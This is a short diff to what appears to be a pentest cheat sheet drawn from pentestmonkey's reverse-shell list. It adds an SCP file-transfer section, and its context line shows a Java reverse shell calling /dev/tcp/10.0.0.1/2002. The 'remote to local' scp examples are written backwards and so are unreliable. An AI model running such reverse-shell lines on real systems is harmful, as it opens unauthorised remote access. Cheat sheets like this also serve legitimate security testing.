@@ -120,5 +120,24 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while rea
 p.waitFor()
 ```
 
+### SCP Transfer
+```
+Local to Remote
+scp file.txt username@IP:/remote/directory
+scp -i private_key file.txt username@IP:/remote/directory
+(Specify Port)
+scp -P 2222 file username@IP:/remote/directory
+
+
+remote to local
+scp file.txt file.txt username@IP:/local/directory
+scp -i private_key file.txt username@IP:/local/directory
+(Moving a folder)
+scp -r foldername username@IP:/local/directory
+(Specify Port)
+scp -P 2222 file username@IP:/local/directory
+```
+
+
 Source:
 http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
